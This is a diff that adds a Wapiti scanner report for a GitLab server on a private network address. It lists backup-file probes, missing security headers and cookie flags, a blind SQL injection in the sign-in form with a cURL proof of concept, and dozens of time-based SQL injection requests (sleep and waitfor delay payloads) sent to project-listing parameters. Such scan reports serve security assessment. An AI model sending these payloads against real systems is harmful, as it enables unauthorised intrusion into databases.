@@ -1,0 +1,1795 @@
+********************************************************************************
+                     Wapiti 3.0.4 - wapiti.sourceforge.io
+                     Report for http://192.168.1.120:9080/
+              Date of the scan : Tue, 04 Jun 2024 22:40:43 +0000
+                          Scope of the scan : folder
+********************************************************************************
+
+Summary of vulnerabilities :
+----------------------------
+                                                              Backup file :  10
+                                                      Blind SQL Injection :   1
+                                                         Weak credentials :   0
+                                                           CRLF Injection :   0
+                                    Content Security Policy Configuration :   4
+                                               Cross Site Request Forgery :   0
+                                               Potentially dangerous file :   0
+                                                        Command execution :   0
+                                                           Path Traversal :   0
+                                                          Htaccess Bypass :   0
+                                                      HTTP Secure Headers :   0
+                                                     HttpOnly Flag cookie :   1
+                                                            Open Redirect :   0
+                                                       Secure Flag cookie :   2
+                                                            SQL Injection :   0
+                                              Server Side Request Forgery :   0
+                                                     Cross Site Scripting :   0
+                                                      XML External Entity :   0
+********************************************************************************
+
+Backup file
+-----------
+Backup file http://192.168.1.120:9080/search/opensearch.xml~ found for http://192.168.1.120:9080/search/opensearch.xml
+Evil request:
+    GET /search/opensearch.xml~ HTTP/1.1
+    Host: 192.168.1.120:9080
+cURL command PoC : "curl "http://192.168.1.120:9080/search/opensearch.xml~""
+
+                                  *   *   *
+
+Backup file http://192.168.1.120:9080/search/opensearch.backup found for http://192.168.1.120:9080/search/opensearch.xml
+Evil request:
+    GET /search/opensearch.backup HTTP/1.1
+    Host: 192.168.1.120:9080
+cURL command PoC : "curl "http://192.168.1.120:9080/search/opensearch.backup""
+
+                                  *   *   *
+
+Backup file http://192.168.1.120:9080/search/opensearch.bck found for http://192.168.1.120:9080/search/opensearch.xml
+Evil request:
+    GET /search/opensearch.bck HTTP/1.1
+    Host: 192.168.1.120:9080
+cURL command PoC : "curl "http://192.168.1.120:9080/search/opensearch.bck""
+
+                                  *   *   *
+
+Backup file http://192.168.1.120:9080/search/opensearch.old found for http://192.168.1.120:9080/search/opensearch.xml
+Evil request:
+    GET /search/opensearch.old HTTP/1.1
+    Host: 192.168.1.120:9080
+cURL command PoC : "curl "http://192.168.1.120:9080/search/opensearch.old""
+
+                                  *   *   *
+
+Backup file http://192.168.1.120:9080/search/opensearch.save found for http://192.168.1.120:9080/search/opensearch.xml
+Evil request:
+    GET /search/opensearch.save HTTP/1.1
+    Host: 192.168.1.120:9080
+cURL command PoC : "curl "http://192.168.1.120:9080/search/opensearch.save""
+
+                                  *   *   *
+
+Backup file http://192.168.1.120:9080/search/opensearch.bak found for http://192.168.1.120:9080/search/opensearch.xml
+Evil request:
+    GET /search/opensearch.bak HTTP/1.1
+    Host: 192.168.1.120:9080
+cURL command PoC : "curl "http://192.168.1.120:9080/search/opensearch.bak""
+
+                                  *   *   *
+
+Backup file http://192.168.1.120:9080/search/opensearch.rar found for http://192.168.1.120:9080/search/opensearch.xml
+Evil request:
+    GET /search/opensearch.rar HTTP/1.1
+    Host: 192.168.1.120:9080
+cURL command PoC : "curl "http://192.168.1.120:9080/search/opensearch.rar""
+
+                                  *   *   *
+
+Backup file http://192.168.1.120:9080/search/opensearch.tgz found for http://192.168.1.120:9080/search/opensearch.xml
+Evil request:
+    GET /search/opensearch.tgz HTTP/1.1
+    Host: 192.168.1.120:9080
+cURL command PoC : "curl "http://192.168.1.120:9080/search/opensearch.tgz""
+
+                                  *   *   *
+
+Backup file http://192.168.1.120:9080/search/opensearch.tbz2 found for http://192.168.1.120:9080/search/opensearch.xml
+Evil request:
+    GET /search/opensearch.tbz2 HTTP/1.1
+    Host: 192.168.1.120:9080
+cURL command PoC : "curl "http://192.168.1.120:9080/search/opensearch.tbz2""
+
+                                  *   *   *
+
+Backup file http://192.168.1.120:9080/search/opensearch.7zip found for http://192.168.1.120:9080/search/opensearch.xml
+Evil request:
+    GET /search/opensearch.7zip HTTP/1.1
+    Host: 192.168.1.120:9080
+cURL command PoC : "curl "http://192.168.1.120:9080/search/opensearch.7zip""
+
+                                  *   *   *
+
+********************************************************************************
+
+Blind SQL Injection
+-------------------
+Blind SQL vulnerability via injection in the parameter user%5Blogin%5D
+Evil request:
+    POST /users/sign_in HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/users/sign_in
+    Content-Type: application/x-www-form-urlencoded
+
+    authenticity_token=GGFsvsgRWCYxAaywLiRevFApEd-ZEj7kM2_mJp1fXh7vrIIfz9wlZrgnHSN3TqU247EOMiztSW8gQ8I_8vKJcQ&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1
+cURL command PoC : "curl "http://192.168.1.120:9080/users/sign_in" -e "http://192.168.1.120:9080/users/sign_in" -d "authenticity_token=GGFsvsgRWCYxAaywLiRevFApEd-ZEj7kM2_mJp1fXh7vrIIfz9wlZrgnHSN3TqU247EOMiztSW8gQ8I_8vKJcQ&user%5Blogin%5D=sleep%287%29%231&user%5Bpassword%5D=Letm3in_&user%5Bremember_me%5D=0&user%5Bremember_me%5D=1""
+
+                                  *   *   *
+
+********************************************************************************
+
+Content Security Policy Configuration
+-------------------------------------
+CSP attribute "default-src" is missing
+Evil request:
+    GET / HTTP/1.1
+    Host: 192.168.1.120:9080
+cURL command PoC : "curl "http://192.168.1.120:9080/""
+
+                                  *   *   *
+
+CSP attribute "script-src" is missing
+Evil request:
+    GET / HTTP/1.1
+    Host: 192.168.1.120:9080
+cURL command PoC : "curl "http://192.168.1.120:9080/""
+
+                                  *   *   *
+
+CSP attribute "object-src" is missing
+Evil request:
+    GET / HTTP/1.1
+    Host: 192.168.1.120:9080
+cURL command PoC : "curl "http://192.168.1.120:9080/""
+
+                                  *   *   *
+
+CSP attribute "base-uri" is missing
+Evil request:
+    GET / HTTP/1.1
+    Host: 192.168.1.120:9080
+cURL command PoC : "curl "http://192.168.1.120:9080/""
+
+                                  *   *   *
+
+********************************************************************************
+
+HttpOnly Flag cookie
+--------------------
+HttpOnly flag is not set in the cookie : preferred_language
+Evil request:
+    GET / HTTP/1.1
+    Host: 192.168.1.120:9080
+cURL command PoC : "curl "http://192.168.1.120:9080/""
+
+                                  *   *   *
+
+********************************************************************************
+
+Secure Flag cookie
+------------------
+Secure flag is not set in the cookie : _gitlab_session
+Evil request:
+    GET / HTTP/1.1
+    Host: 192.168.1.120:9080
+cURL command PoC : "curl "http://192.168.1.120:9080/""
+
+                                  *   *   *
+
+Secure flag is not set in the cookie : preferred_language
+Evil request:
+    GET / HTTP/1.1
+    Host: 192.168.1.120:9080
+cURL command PoC : "curl "http://192.168.1.120:9080/""
+
+                                  *   *   *
+
+********************************************************************************
+
+Summary of anomalies :
+----------------------
+                                                    Internal Server Error : 200
+                                                     Resource consumption :   0
+********************************************************************************
+
+Internal Server Error
+---------------------
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects?archived=only&name=%29%3Bwaitfor%2F%2A%2A%2Fdelay%2F%2A%2A%2F%270%3A0%3A7%27--1&sort=name_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects?archived=sleep%287%29%231&name=default&sort=created_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects?archived=sleep%287%29%23%0A1&name=default&sort=created_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects?archived=sleep%287%29%231&name=default&sort=stars_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects?archived=only%2Csleep%287%29%231&name=default&sort=name_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects?archived=sleep%287%29%231&name=default&sort=latest_activity_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects?archived=true&name=sleep%287%29%231&sort=latest_activity_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects?archived=true&name=sleep%287%29%231&sort=name_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects?archived=true&name=sleep%287%29%231&sort=stars_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects?archived=true&name=sleep%287%29%231&sort=created_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects?archived=true&name=sleep%287%29%231&sort=created_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects?name=sleep%287%29%231&sort=created_desc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects?archived=only&sort=created_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects?name=sleep%287%29%231&sort=created_desc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects?archived=true&sort=created_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects?name=sleep%287%29%231&sort=name_asc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects?archived=only&sort=name_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects?name=sleep%287%29%231&sort=latest_activity_asc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects?archived=only&sort=latest_activity_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects?name=sleep%287%29%231&sort=created_asc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects?archived=only&sort=created_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects?name=sleep%287%29%231&sort=name_desc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects?archived=only&sort=name_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects?name=sleep%287%29%231&sort=stars_desc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects?archived=only&sort=stars_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects?name=sleep%287%29%231&sort=latest_activity_asc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects?archived=true&sort=latest_activity_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects?name=sleep%287%29%231&sort=created_asc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects?archived=true&sort=created_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects?name=sleep%287%29%231&sort=name_desc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects?archived=true&sort=name_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects?name=sleep%287%29%231&sort=name_asc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects?archived=true&sort=name_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects?name=sleep%287%29%231&sort=stars_desc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects?archived=true&sort=stars_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /explore/projects/starred?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=latest_activity_desc&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter sort
+Evil request:
+    GET /explore/projects/starred?sort=sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/starred?archived=sleep%287%29%231&sort=latest_activity_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter sort
+Evil request:
+    GET /explore/projects/starred?archived=only&sort=sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=stars_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=created_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/starred?archived=sleep%287%29%231&name=default&sort=latest_activity_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=name_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=name_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=created_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=latest_activity_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?archived=only&name=sleep%287%29%231&sort=latest_activity_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=latest_activity_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=name_asc&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?sort=name_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/starred?archived=sleep%287%29%231&sort=name_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=latest_activity_desc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?archived=true&sort=latest_activity_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/starred?archived=sleep%287%29%231&sort=created_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/starred?archived=sleep%287%29%231&sort=name_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/starred?archived=sleep%287%29%231&sort=created_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/starred?archived=sleep%287%29%231&sort=latest_activity_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/starred?archived=sleep%287%29%231&sort=stars_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=latest_activity_desc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?archived=only&sort=latest_activity_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=created_desc&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?sort=created_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=created_asc&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?sort=created_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=name_desc&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?sort=name_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=stars_desc&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?sort=stars_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=latest_activity_asc&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?sort=latest_activity_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/starred?archived=sleep%287%29%231&name=default&sort=stars_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?archived=true&name=sleep%287%29%231&sort=stars_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/starred?archived=sleep%287%29%231&name=default&sort=created_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?archived=only&name=sleep%287%29%231&sort=created_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/starred?archived=sleep%287%29%231&name=default&sort=latest_activity_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/starred?archived=sleep%287%29%231&name=default&sort=created_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/starred?archived=sleep%287%29%231&name=default&sort=name_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/starred?archived=sleep%287%29%231&name=default&sort=name_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?archived=only&name=sleep%287%29%231&sort=name_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?archived=only&name=sleep%287%29%231&sort=name_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?archived=only&name=sleep%287%29%231&sort=created_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?archived=only&name=sleep%287%29%231&sort=latest_activity_asc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=name_asc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?archived=only&sort=name_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=name_asc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?archived=true&sort=name_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=created_asc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?archived=true&sort=created_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=name_desc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?archived=true&sort=name_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=created_desc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?archived=true&sort=created_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=latest_activity_asc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?archived=true&sort=latest_activity_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=stars_desc&archived=true&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?archived=true&sort=stars_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=created_asc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?archived=only&sort=created_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=created_desc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?archived=only&sort=created_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=name_desc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?archived=only&sort=name_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=latest_activity_asc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?archived=only&sort=latest_activity_asc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/starred?name=sleep%287%29%231&sort=stars_desc&archived=only&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/starred?archived=only&sort=stars_desc
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /explore/projects/topics?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter search
+Evil request:
+    GET /explore/projects/topics?search=sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/topics
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the query string
+Evil request:
+    GET /explore/projects/trending?sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=latest_activity_desc&commit=submit HTTP/1.1
+    Host: 192.168.1.120:9080
+    Referer: http://192.168.1.120:9080/explore/projects/trending
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter sort
+Evil request:
+    GET /explore/projects/trending?sort=sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/trending?archived=sleep%287%29%231&sort=latest_activity_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter sort
+Evil request:
+    GET /explore/projects/trending?archived=only&sort=sleep%287%29%231 HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=latest_activity_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter archived
+Evil request:
+    GET /explore/projects/trending?archived=sleep%287%29%231&name=default&sort=latest_activity_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?name=sleep%287%29%231&sort=created_desc HTTP/1.1
+    Host: 192.168.1.120:9080
+
+                                  *   *   *
+
+The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter name
+Evil request:
+    GET /explore/projects/trending?archived=only&name=sleep%287%29%231&sort=latest_activity_desc HTTP/1.1
